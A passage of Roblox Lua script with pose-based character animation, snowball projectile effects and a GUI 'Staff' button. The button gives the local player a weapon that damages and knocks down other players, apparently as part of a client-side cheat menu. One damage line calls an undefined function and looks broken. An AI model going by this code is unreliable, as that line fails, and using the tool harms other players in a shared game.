				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.5,-1,0),Vector3.new(-0.05 + (angle*0.018),0,0.01 - (angle*0.005))) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,-1,0),Vector3.new(-0.05 + (angle*0.018),0,-0.01 + (angle*0.005))) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.04 + (-angle*0.02),0,0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(0.016 + (-angle*0.009),0,0)) 
			end 

		elseif script.pose.Value == 1 then 
			----- crouch --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.35,0.66 - (angle*0.012),0.12),Vector3.new(-0.1 + (angle*0.015),-0.22,0.446 - (angle*0.016))) 
			end
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.35,0.66 - (angle*0.012),0.12),Vector3.new(-0.1 + (angle*0.015),0.22,-0.446 + (angle*0.016))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.55,-1.05,-0.47 - (angle*0.006)),Vector3.new(-math.pi/2.2 + (angle*0.005),-math.pi/15,0.01 + (angle*0.005))) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,0.3,-0.55),Vector3.new(0.3 + (angle*0.01),-math.pi/12,0.08 + (angle*0.005))) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.12 + (angle*0.004),-math.pi/5,0.1)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,-1.4,0),Vector3.new(-0.16 + (-angle*0.007),math.pi/5,0)) 
			end 

		elseif script.pose.Value == 2 then 

		end 
	end 

	function Walking() 
		if script.pose.Value == 0 then 
			----- regular --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.5,0),Vector3.new(angle*0.2,0,-math.abs(angle*0.02))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.5,0),Vector3.new(-angle*0.2,0,math.abs(angle*0.02))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.5,-1,0),Vector3.new(-angle*0.17,0,math.abs(angle*0.005))) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,-1,0),Vector3.new(angle*0.17,0,-math.abs(angle*0.005))) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.015 ,-angle*0.01,0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(-0.015 - math.abs((angle*0.02)),angle*0.01,0)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 1 then 
			----- crouch --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.35,0.66 + (angle*0.012),0.12),Vector3.new(0.2 + (angle*0.02),-0.22,0.446 + (angle*0.016))) 
			end
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.35,0.66 + (angle*0.012),0.12),Vector3.new(0.2 + (angle*0.02),0.22,-0.446 - (angle*0.016))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.7,-0.18 - (cangle*0.04),-0.2 - (angle*0.01)),Vector3.new(0.2 - (angle*0.12),-math.pi/5,0.12 - (angle*0.06))) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.38,-0.32 + (cangle*0.04),-0.45 + (angle*0.01)),Vector3.new(-0.1 + (angle*0.15),-math.pi/5,-0.07 + (angle*0.07))) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.12 + (angle*0.004),-math.pi/5 - (angle*0.01),0.1)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,-0.7,0),Vector3.new(-0.24 + (-angle*0.008),math.pi/5 + (angle*0.01),angle*0.01)) 
			end 

		elseif script.pose.Value == 2 then 

		end 
	end 

	function Running() 
		if script.pose.Value == 0 then 
			----- regular --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5 - math.abs(angle*0.035),0.5 - math.abs(angle*0.02),0),Vector3.new(0.16 + (angle*0.42),0,-math.abs(angle*0.07))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5 + math.abs(angle*0.035),0.5 - math.abs(angle*0.02),0),Vector3.new(0.16 + (-angle*0.42),0,math.abs(angle*0.07))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.5,-1 + math.abs(angle*0.05),0),Vector3.new(-angle*0.3,0,math.abs(angle*0.005))) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,-1 + math.abs(angle*0.05),0),Vector3.new(angle*0.3,0,-math.abs(angle*0.005))) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.07 + math.abs(-angle*0.02),-angle*0.03,0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(-0.14 - math.abs(-angle*0.04),angle*0.035,NV)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 1 then 

		elseif script.pose.Value == 2 then 

		end 
	end 


	function Jumping() 
		if script.pose.Value == 0 then 
			----- regular --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.5,0),Vector3.new(-0.16,0,0.3 + (angle*0.012))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.5,0),Vector3.new(-0.16,0,-0.3 - (angle*0.012))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.5,-0.8,-0.05),Vector3.new(-0.28 + (angle*0.02),0,0)) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,-0.45,-0.55),Vector3.new(-0.4 - (angle*0.02),0,0)) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.1,-angle*0.01,0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(0.2 + (angle*0.002),angle*0.02,0)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 1 then 
			----- crouch --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.5,0),Vector3.new(-0.16,0,0.3 + (angle*0.012))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.5,0),Vector3.new(-0.16,0,-0.3 - (angle*0.012))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.7,-0.8,-0.05),Vector3.new(-0.28 + (angle*0.001),-math.pi/6,-0.2)) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.3,-0.45,-0.55),Vector3.new(-0.4 - (angle*0.001),-math.pi/6,-0.2)) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.1,-math.pi/5 - (angle*0.01),0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(-0.07 + (angle*0.002),math.pi/5 + (angle*0.02),0)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 2 then 

		end 
	end 

	function Falling() 
		if script.pose.Value == 0 then 
			----- regular --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.5,0),Vector3.new(math.pi*1.1,0,-0.08 + (angle*0.012))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.5,0),Vector3.new(math.pi*1.1,0,0.08 - (angle*0.012))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.5,-0.45,-0.55),Vector3.new(-0.4 + (angle*0.02),0,0)) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.5,-0.8,-0.05),Vector3.new(-0.28 - (angle*0.02),0,0)) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.1,-angle*0.01,0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(-0.2 + (angle*0.002),angle*0.02,0)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 1 then 
			----- crouch --------
			if not cancelra then 
				SetWeld(RS,slidecount,slidecountmax,rs,rsa,Vector3.new(1.5,0.65,0),Vector3.new(-0.1,0,0.3 + (angle*0.012))) 
			end 
			if not cancella then 
				SetWeld(LS,slidecount,slidecountmax,ls,lsa,Vector3.new(-1.5,0.65,0),Vector3.new(-0.1,0,-0.3 - (angle*0.012))) 
			end 
			if not cancelrl then 
				SetWeld(RH,slidecount,slidecountmax,rh,rha,Vector3.new(0.8,-0.1,-0.25),Vector3.new(-0.28 + (angle*0.001),-math.pi/6,-0.2)) 
			end 
			if not cancelll then 
				SetWeld(LH,slidecount,slidecountmax,lh,lha,Vector3.new(-0.3,-0.8,-0.55),Vector3.new(-0.4 - (angle*0.001),-math.pi/6,-0.2)) 
			end 
			if not canceln then 
				SetWeld(N,slidecount,slidecountmax,n,na,Vector3.new(0,1,0),Vector3.new(0.1,-math.pi/5 - (angle*0.01),0)) 
			end 
			if not cancelhrp then 
				SetWeld(HRJ,slidecount,slidecountmax,hrj,hrja,Vector3.new(0,0,0),Vector3.new(-0.07 + (angle*0.002),math.pi/5 + (angle*0.02),0)) 
			end 
			if not cancelmain and Main.Value ~= nil and main ~= nil and maina ~= nil then 
				SetWeld(Main.Value,slidecount,slidecountmax,main,maina,Vector3.new(0,-1,0),NV) 
			end 

		elseif script.pose.Value == 2 then 

		end 
	end 

	game:GetService("RunService").Stepped:connect(function() 
		count1 = (count1%100) + countspeed 
		angle = math.pi * math.sin(math.pi*2/100*count1) 
		cangle = math.pi * math.cos(math.pi*2/100*count1) 

		------------- snowball power gui movement ------------------
		if SPC.Archivable == true then 
			SPCP = SPCP ~= 14 and SPCP+1 or 14 
		else 
			SPCP = SPCP ~= 0 and SPCP-1 or 0 
		end 
		if SPC ~= nil then 
			local perc = math.sin((math.pi/2/14)*SPCP) 
			SPC.Position = UDim2.new(1,10 - (50*perc),0.5,-55) 
			if SPCP > 0 then 
				SPC.Visible = true 
			else 
				SPC.Visible = false 
			end
		end 

		------------- walkspeed changes -------------------------
		if DisableMovement then 
			Walkspeed = 0 
			Hu.WalkSpeed = Walkspeed 
		else 
			if Shift and pose.Value ~= 1 then 
				Walkspeed = 25 
				Hu.WalkSpeed = Walkspeed 
			else 
				Walkspeed = 16 
				if pose.Value == 1 then 
					Hu.WalkSpeed = Walkspeed/2 
				else 
					Hu.WalkSpeed = Walkspeed 
				end 
			end 
		end 

		-------- animation slide count and pose smoothener --------------------
		slidecount = (slidecount < slidecountmax and slidecount+1) or slidecountmax 
		SlideCooldown = (SlideCooldown > 0 and SlideCooldown-1) or 0 

		if script.pose.Value ~= lastpose then 
			UpdateWP() 
		end 

		--------- animation conditions -------------------

		local ghitz, genz = RAY(Torsoz.Position,Vector3.new(0,-5.2,0)) 

		if ghitz == nil and Torsoz.Velocity.y > 1 then 
			----- jumping -----
			anim = 3 
			if anim ~= lastanim then 
				UpdateWP(7) 
			end 
			Jumping() 
		elseif ghitz == nil and Torsoz.Velocity.y < -1 then 
			----- falling ------
			anim = 4 
			if anim ~= lastanim then 
				UpdateWP(7) 
			end 
			Falling() 
		elseif Vector3.new(Torsoz.Velocity.x,0,Torsoz.Velocity.z).magnitude < 2 then 
			---- idle ---------
			anim = 0 
			if anim ~= lastanim then 
				UpdateWP(6) 
			end 
			Idle() 

		elseif Vector3.new(Torsoz.Velocity.x,0,Torsoz.Velocity.z).magnitude < 17 then 
			---- walking -------
			anim = 1 
			if anim ~= lastanim then 
				UpdateWP(7) 
			end 
			Walking() 

		elseif Vector3.new(Torsoz.Velocity.x,0,Torsoz.Velocity.z).magnitude >= 17 then 
			----- running -----
			anim = 2 
			if anim ~= lastanim then 
				UpdateWP(5) 
			end 
			Running() 

			------------
		end 

		--------- breakfall roll --------
		if ghitz ~= nil and prevvelocity.y < -110 then 
			invoke.Value = 2 
		end 

		--------- snowball projectile movement --------
		for i, v in pairs(SnowballProjectiles) do 
			local oldpos = v[1].Position 
			v[1].CFrame = v[1].CFrame + (v[4]*v[5]) + Vector3.new(0,v[3],0) 
			local raydist = (v[1].Position-oldpos).unit*((oldpos-v[1].Position).magnitude+0.5)
			local hitz,enz = RAY(v[1].Position,raydist) 

			v[3] = v[3] - 0.35*v[2] 
			v[9] = v[9] +1

			if #v[8] > 0 then 
				v[8][v[7]].Parent = v[1].Parent 
				v[8][v[7]].Transparency = 0.5 - (0.3 * math.random()) 
				v[8][v[7]].Mesh.Scale = Vector3.new(0.45,0.45,0.45) - (Vector3.new(0.3,0.3,0.3) * math.random()) 
				v[8][v[7]].CFrame = CFrame.new(oldpos,v[1].Position) * CFrame.Angles(0,0,(math.pi*2)/(math.random(1,100)/100)) * CFrame.new(math.random(1,10)/20,0,0) 
				v[7] = (v[7]%#v[8]) +1 
				for j,vv in pairs(v[8]) do 
					vv.CFrame = vv.CFrame * CFrame.new(0.05,0,0) * CFrame.Angles(0,-0.1,-0.085) 
				end 
			end 

			if hitz ~= nil or v[9] >= 200 then 
				if hitz ~= nil then 
					SnowballHit(hitz,enz,v[6]) 
				end 
				v[1].Parent:Destroy() 
				print("Removed Snowball#",i) 
				table.remove(SnowballProjectiles,i) 
			end 

		end 

		------ snowball splosion effects -----
		for i, v in pairs(SnowSplosionEffects) do 
			for j,vv in pairs(v:GetChildren()) do 
				vv.CFrame = vv.CFrame * CFrame.new(0.3,0,0) 
				vv.Transparency = vv.Transparency + 0.12 
				vv.Mesh.Scale = vv.Mesh.Scale + Vector3.new(0.3,-0.1,-0.1) 
			end 
			if v:FindFirstChild("Effect").Transparency > 0.9 then 
				v:Destroy() 
				table.remove(SnowSplosionEffects,i) 
			end 
		end 

		lastpose = script.pose.Value 
		lastanim = anim 
		prevvelocity = HRP.Velocity 
	end)
end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Staff"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Staff"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	if script.Parent.className ~= "HopperBin" then 

		local admin = game.Players.LocalPlayer
		bin = Instance.new("HopperBin", admin.Backpack)
		player = bin.Parent.Parent.Character 
		rarm = player["Right Arm"] 
		larm = player["Left Arm"] 
		player.Humanoid.MaxHealth = 50 
		visible = true 
		parts = {} 

		function Check(pos) 
			local hurt = false 
			local players = game.Players:GetChildren() 
			for i = 1, #players do 
				if players[i].Character and hurt == false then 
					local parts = players[i].Character:GetChildren() 
					for q = 1, #parts do 
						if parts[q].className == "Part" and hurt == false then 
							local range = math.sqrt(math.pow(parts[q].Size.Z, 2) + math.sqrt(math.pow(parts[q].Size.X, 2) + math.pow(parts[q].Size.Y, 2))) 
							if (found - parts[q].Position).magnitude <= range then 
								hurt = true 
								character = parts[q].Parent 
								humanoid = character.Humanoid 
								character.Torso.CFrame = character.Torso.CFrame*CFrame.Angles(2,2,2)-amage(25) 
								humanoid:TakeDamage(50) 
								humanoid.Sit = true 
							end 
						end 
					end 
				end 
			end 
		end 

		function clean(min,thing2) 
			while min.Humanoid.Health ~= 0 do 
				local a = game.Players:GetChildren() 
				for i = 1, #a do 
					wait() 
					if (a[i].Character.Torso.Position - thing2.Position).magnitude < 5 then 
						a[i].Character.Humanoid:TakeDamage(5) 
					end 
				end 
				wait() 
			end 
			min:remove() 
		end 

		function fire(v) 
			local spawnPos = (tip2.CFrame * CFrame.new(0, 1, 0)).p 
			local HitSpot = RayCast(spawnPos, v) 
			local distance = (HitSpot - spawnPos).magnitude 
			start = nil 
			finish = nil 
			local num = math.random(3, 10) 
			for i = distance / num, distance, distance / num do 
				if start == nil then 
					start = tip2.CFrame.p 
				elseif start ~= nil then 
					start = finish 
				end 
				finish = CFrame.new(spawnPos, HitSpot) 
				if i ~= distance then 
					finish = (finish * CFrame.new(math.random(-5, 5), math.random(-1, 1), -i)).p 
				else 
					finish = HitSpot 
				end 
				local P = Instance.new("Part") 
				P.Name = "Magic" 
				P.formFactor = 0 
				P.Size = Vector3.new(1, 1, (start - finish).magnitude) 
				P.Parent = game.Workspace 
				P.BrickColor = BrickColor.new(1006) 
				P.Anchored = true 
				P.CanCollide = false 
				P.TopSurface = "Smooth" 
				P.BottomSurface = "Smooth" 
				P.Transparency = 0 
				m = Instance.new("BlockMesh") 
				m.Scale = Vector3.new(.25, .25, 1) 
				m.Offset = Vector3.new(0, -1000, 0) 
				m.VertexColor = Vector3.new(math.huge, math.huge, math.huge) 
				m.Parent = P 
				P.CFrame = CFrame.new(start, finish) 
				P.CFrame = P.CFrame * CFrame.new(0, 1000, P.Size.Z / -2) 
				table.insert(parts, P) 
				game:GetService("Debris"):AddItem(P, 2.5) 
			end 
		end 

		function RayCast(start, v) 

			local ray = Instance.new("Part") 
			ray.Parent = game.Workspace 
			ray.Anchored = true 
			ray.CFrame = CFrame.new(start) 
			ray.Size = Vector3.new(1,1,1) 
			ray.Shape = 0 
			ray.BottomSurface = 0 
			ray.TopSurface = 0 
			ray.Name = "Magic" 
			ray.Elasticity = 0 
			ray.Reflectance = 0 
			ray.Friction = 0 
			ray.Transparency = 0 

			local finding = true 
			far = 1000 

			while finding do 
				far = far - 1 
				if far > 0 then 
					local see = ray.Position + v 
					ray.Position = ray.Position + v 
					if ray.Position ~= see then 
						finding = false 
						found = see 
					end 
				else 
					finding = false 
					found = ray.Position 
				end 
			end 

			ray:remove() 
			Check(found) 
			return found 
		end 

		function kill(tar) 
			while tar.Parent.Humanoid.Health ~= 0 do 
				tar.Parent.Humanoid.Health = tar.Parent.Humanoid.Health -1 
				wait() 
			end 
		end 

		bin.Selected:connect(function(mouse) 
			if player.Torso:findFirstChild("Right Shoulder") ~= nil then 
				rs = player.Torso["Right Shoulder"] 
				rs.Part1 = nil 
			end 
			if player.Torso:findFirstChild("Left Shoulder") ~= nil then 
				ls = player.Torso["Left Shoulder"] 
				ls.Part1 = nil 
			end 
			if player:FindFirstChild("check") == nil then 
				rns = Instance.new("Weld") 
				rns.Parent = player.Torso 
				rns.Part0 = rns.Parent 
				rns.Part1 = player["Right Arm"] 
				rns.C1 = CFrame.new(-1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*-.05)) 
				lns = Instance.new("Weld") 
				lns.Parent = player.Torso 
				lns.Part0 = lns.Parent 
				lns.Part1 = player["Left Arm"] 
				lns.C1 = CFrame.new(1.51,.1,-.05)*CFrame.Angles((math.pi*-.0),(math.pi*0),(math.pi*.05)) 
				rblade = Instance.new("Part") 
				rblade.BrickColor = BrickColor.new(1003) 
				rblade.Name ="check" 
				rblade.Parent = player 
				rblade.CanCollide = false 
				rblade.Size = Vector3.new(1,8,1) 
				rblade.formFactor = "Symmetric" 
				rblade.TopSurface = 0 
				rblade.BottomSurface = 0 
				rbm = Instance.new("BlockMesh") 
				rbm.Parent = rblade 
				rbm.Scale = Vector3.new(.4,1,.4) 
				rbw = Instance.new("Weld") 
				rbw.Parent = rblade 
				rbw.Part0 = rarm 
				rbw.Part1 = rblade 
				rbw.C1 = CFrame.new(0,0,1) *CFrame.Angles((math.pi*.5),(math.pi*0),(math.pi*0)) 
				tip = Instance.new("Part") 
				tip.CanCollide = false 
				tip.TopSurface = 0 
				tip.BottomSurface = 0 
				tip.Parent = rblade 
				tip.Size = Vector3.new(1,1,1) 
				tip.formFactor = "Symmetric" 
				tip.BrickColor = BrickColor.new(1004) 
				tipm = Instance.new("BlockMesh") 
				tipm.Scale = Vector3.new(.41,.2,.41) 
				tipm.Parent = tip 
				tipw = Instance.new("Weld") 
				tipw.Parent = rblade 
				tipw.Part0 = rblade 
				tipw.Part1 = tip 
				tipw.C1 = CFrame.new(0,3.5,0) 
				tip2 = Instance.new("Part") 
				tip2.CanCollide = false 
				tip2.TopSurface = 0 
				tip2.BottomSurface = 0 
				tip2.Parent = rblade 
				tip2.Size = Vector3.new(1,1,1) 
				tip2.formFactor = "Symmetric" 
				tip2.BrickColor = BrickColor.new(1004) 
				tip2m = Instance.new("BlockMesh") 
				tip2m.Scale = Vector3.new(.41,.2,.41) 
				tip2m.Parent = tip2 
				tip2w = Instance.new("Weld") 
				tip2w.Parent = rblade 
				tip2w.Part0 = rblade 
				tip2w.Part1 = tip2 
				tip2w.C1 = CFrame.new(0,-3.5,0) 
				tip3 = Instance.new("Part") 
				tip3.CanCollide = false 
				tip3.TopSurface = 0 
				tip3.BottomSurface = 0 
				tip3.Parent = rblade 
				tip3.Size = Vector3.new(1,1,1) 
				tip3.formFactor = "Symmetric" 
				tip3.BrickColor = BrickColor.new(1004) 
				tip3m = Instance.new("BlockMesh") 
				tip3m.Scale = Vector3.new(.41,.2,.41) 
				tip3m.Parent = tip3 
				tip3w = Instance.new("Weld") 
				tip3w.Parent = rblade 
				tip3w.Part0 = rblade 
				tip3w.Part1 = tip3 
				tip3w.C1 = CFrame.new(0,-.5,0) 
				tip4 = Instance.new("Part") 
				tip4.CanCollide = false 
				tip4.TopSurface = 0 
				tip4.BottomSurface = 0 
				tip4.Parent = rblade 
				tip4.Size = Vector3.new(1,1,1) 
				tip4.formFactor = "Symmetric" 
				tip4.BrickColor = BrickColor.new(1004) 
				tip4m = Instance.new("BlockMesh") 
				tip4m.Scale = Vector3.new(.41,.2,.41) 
				tip4m.Parent = tip4 
				tip4w = Instance.new("Weld") 
				tip4w.Parent = rblade 
				tip4w.Part0 = rblade 
				tip4w.Part1 = tip4 
				tip4w.C1 = CFrame.new(0,.5,0) 
				tip5 = Instance.new("Part") 
				tip5.CanCollide = false 
				tip5.TopSurface = 0 
				tip5.BottomSurface = 0 
				tip5.Parent = rblade 
				tip5.Size = Vector3.new(1,1,1) 
				tip5.formFactor = "Symmetric" 
				tip5.BrickColor = BrickColor.new(1004) 
				tip5m = Instance.new("BlockMesh") 
				tip5m.Scale = Vector3.new(.41,.2,.41) 
				tip5m.Parent = tip5 
				tip5w = Instance.new("Weld") 
				tip5w.Parent = rblade 
				tip5w.Part0 = rblade 
				tip5w.Part1 = tip5 
				tip5w.C1 = CFrame.new(0,0,0) 
				tip6 = Instance.new("Part") 
				tip6.CanCollide = false 
				tip6.TopSurface = 0 
				tip6.BottomSurface = 0 
				tip6.Parent = rblade 
				tip6.Size = Vector3.new(1,1,1) 
				tip6.formFactor = "Symmetric" 
				tip6.BrickColor = BrickColor.new(1004) 
				tip6m = Instance.new("BlockMesh") 
				tip6m.Scale = Vector3.new(.05,.6,.41) 
				tip6m.Parent = tip6 
				tip6w = Instance.new("Weld") 
				tip6w.Parent = rblade 
				tip6w.Part0 = rblade 
				tip6w.Part1 = tip6 
				tip6w.C1 = CFrame.new(0,-3,0) 
				tip7 = Instance.new("Part") 
				tip7.CanCollide = false 
				tip7.TopSurface = 0 
				tip7.BottomSurface = 0 
				tip7.Parent = rblade 
				tip7.Size = Vector3.new(1,1,1) 
				tip7.formFactor = "Symmetric" 
				tip7.BrickColor = BrickColor.new(1004) 
				tip7m = Instance.new("BlockMesh") 
				tip7m.Scale = Vector3.new(.41,.6,.05) 
				tip7m.Parent = tip7 
				tip7w = Instance.new("Weld") 
				tip7w.Parent = rblade 
				tip7w.Part0 = rblade 
				tip7w.Part1 = tip7 
				tip7w.C1 = CFrame.new(0,-3,0) 
				tip6a = Instance.new("Part") 
				tip6a.CanCollide = false 
				tip6a.TopSurface = 0 
				tip6a.BottomSurface = 0 
				tip6a.Parent = rblade 
				tip6a.Size = Vector3.new(1,1,1) 
				tip6a.formFactor = "Symmetric" 
				tip6a.BrickColor = BrickColor.new(1004) 
				tip6am = Instance.new("BlockMesh") 
				tip6am.Scale = Vector3.new(.15,.6,.41) 
				tip6am.Parent = tip6a 
				tip6aw = Instance.new("Weld") 
				tip6aw.Parent = rblade 
				tip6aw.Part0 = rblade 
				tip6aw.Part1 = tip6a 
				tip6aw.C1 = CFrame.new(0,-2.5,0) 
				tip7a = Instance.new("Part") 
				tip7a.CanCollide = false 
				tip7a.TopSurface = 0 
				tip7a.BottomSurface = 0 
				tip7a.Parent = rblade 
				tip7a.Size = Vector3.new(1,1,1) 
				tip7a.formFactor = "Symmetric" 
				tip7a.BrickColor = BrickColor.new(1004) 
				tip7am = Instance.new("BlockMesh") 
				tip7am.Scale = Vector3.new(.41,.6,.15) 
				tip7am.Parent = tip7a 
				tip7aw = Instance.new("Weld") 
				tip7aw.Parent = rblade 
				tip7aw.Part0 = rblade 
				tip7aw.Part1 = tip7a 
				tip7aw.C1 = CFrame.new(0,-2.5,0) 
				tip6b = Instance.new("Part") 
				tip6b.CanCollide = false 
				tip6b.TopSurface = 0 
				tip6b.BottomSurface = 0 
				tip6b.Parent = rblade 
				tip6b.Size = Vector3.new(1,1,1) 
				tip6b.formFactor = "Symmetric" 
				tip6b.BrickColor = BrickColor.new(1004) 
				tip6bm = Instance.new("BlockMesh") 
				tip6bm.Scale = Vector3.new(.05,.6,.41) 
				tip6bm.Parent = tip6b 
				tip6bw = Instance.new("Weld") 
				tip6bw.Parent = rblade 
				tip6bw.Part0 = rblade 
				tip6bw.Part1 = tip6b 
				tip6bw.C1 = CFrame.new(0,-2,0) 
				tip7b = Instance.new("Part") 
				tip7b.CanCollide = false 
				tip7b.TopSurface = 0 
				tip7b.BottomSurface = 0 
				tip7b.Parent = rblade 
				tip7b.Size = Vector3.new(1,1,1) 
				tip7b.formFactor = "Symmetric" 
				tip7b.BrickColor = BrickColor.new(1004) 
				tip7bm = Instance.new("BlockMesh") 
				tip7bm.Scale = Vector3.new(.41,.6,.05) 
				tip7bm.Parent = tip7b 
				tip7bw = Instance.new("Weld") 
				tip7bw.Parent = rblade 
				tip7bw.Part0 = rblade 
				tip7bw.Part1 = tip7b 
				tip7bw.C1 = CFrame.new(0,-2,0) 

				rblade.Touched:connect(function(hit) 
					if hit.Parent:findFirstChild("Humanoid") ~= nil then 
						if hit.Parent.Name ~= player.Name then 
							if hit.Parent.Humanoid.MaxHealth > 100 then 
								hit.Parent.Humanoid.MaxHealth = 100 
							end 
							hit.Parent.Humanoid.Health = hit.Parent.Humanoid.Health - math.random(5,15) 
							hit.Parent.Humanoid.Sit = true 
							for i = 1, (math.random(1,3)) do 
								wait() 
								local bleed = Instance.new("Part") 
								bleed.formFactor = "Symmetric" 
								bleed.Size = Vector3.new(1,1,1) 
								bleed.BrickColor = BrickColor.new(1004) 
								bleed.TopSurface = 0 
								bleed.BottomSurface = 0 
								bleed.Reflectance = .1 
								bleed.Transparency = 0 
								bleed.Parent = Workspace 
								bleed.Position = rblade.Position 
								local bleedm = Instance.new("SpecialMesh") 
								bleedm.MeshType = "Sphere" 
								bleedm.Scale = Vector3.new(.5,.5,.5) 
								bleedm.Parent = bleed 
								game:GetService("Debris"):AddItem(bleed, 5) 
							end 
						end 
					end 
				end) 

			end 
			-- animations-- 
			right = rns 
			staff = rblade 
			left = lns 
